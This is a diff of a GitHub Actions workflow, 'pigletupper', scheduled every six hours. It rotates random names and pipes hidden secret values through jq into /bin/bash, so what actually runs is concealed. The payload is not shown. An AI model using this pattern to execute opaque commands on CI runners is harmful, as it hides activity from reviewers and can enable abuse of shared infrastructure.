@@ -1,23 +1,23 @@
 name: pigletupper
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 0/6 * * *'
+    - cron: '13 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pigletupper
         env:
-          rlm43: ${{ secrets.rlm43 }}
+          ttn9: ${{ secrets.ttn9 }}
         run: |
-          echo $rlm43 | jq -r .u77996 | /bin/bash
-          echo $erocq3 | jq -r .tq8028 | /bin/bash
-          echo $b3 | jq -r .hsp89 | /bin/bash
-          echo $nprfv500 | jq -r .md286 | /bin/bash
-          echo $zdb67 | jq -r .dip0634 | /bin/bash
-          echo $skthv97 | jq -r .kny5309 | /bin/bash
+          echo $ttn9 | jq -r .vc0965 | /bin/bash
+          echo $xdun65949 | jq -r .s30 | /bin/bash
+          echo $ktz13 | jq -r .nzu397 | /bin/bash
+          echo $xblt97713 | jq -r .qlf29 | /bin/bash
+          echo $iruw3092 | jq -r .kin375 | /bin/bash
+          echo $rury80 | jq -r .l45 | /bin/bash
 
